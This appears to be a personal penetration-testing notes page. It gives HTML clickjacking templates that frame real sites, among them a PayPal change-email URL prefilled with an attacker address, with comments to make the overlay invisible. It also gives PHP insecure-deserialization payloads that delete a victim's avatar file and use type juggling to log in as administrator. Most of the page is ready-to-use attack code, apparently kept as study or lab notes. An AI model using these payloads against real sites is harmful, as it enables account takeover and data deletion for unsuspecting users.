# Clickjacking

```html
EXAMPLE CLICKJACKING Codes >

---------------- Basic CJ with csrf protection ------------------
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1; # SHOULD BE LESS
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
    }
</style>
<div>click to test</div>
<iframe src="https://prime.gsbcapital.mn/home"></iframe>
-------------------------------------------------------------------

--------------- FORM DATA PREFILLE BY URL PARAMETER ---------------
<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1; # SHOULD BE LESS 
        z-index: 2;
    }
    div {
        position:absolute;
        top:450;
        left:80;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://paypal.com/change-mail?email=hacked@ok.com"></iframe>
---------------------------------------------------------------------

<style>
    iframe {
        position:relative;
        width:700px;
        height: 500px;
        opacity: 1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://ok.net/my-account?email=hacker@attacker-website.com"></iframe>

```

- Insecure deserialization
    
    ![Untitled](Clickjacking%20ff8af9c08d7f4836a9ead90bf73ee5f2/Untitled.png)
    
    ```php
    O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"oglw9i97a3lad7nqidovtazuz6wyo0ib";s:11:"avatar_link";s:23:"/victim/pro.jpg";}
    
    Idea > Changes my avatar link to victim's avatar then deletes my account. victim is avatar gets deleted too
    ```
    
    ```php
    PHP Type juggling ( changes access token length to 0. changes string to int )
    
    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"foo";
    O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
    ```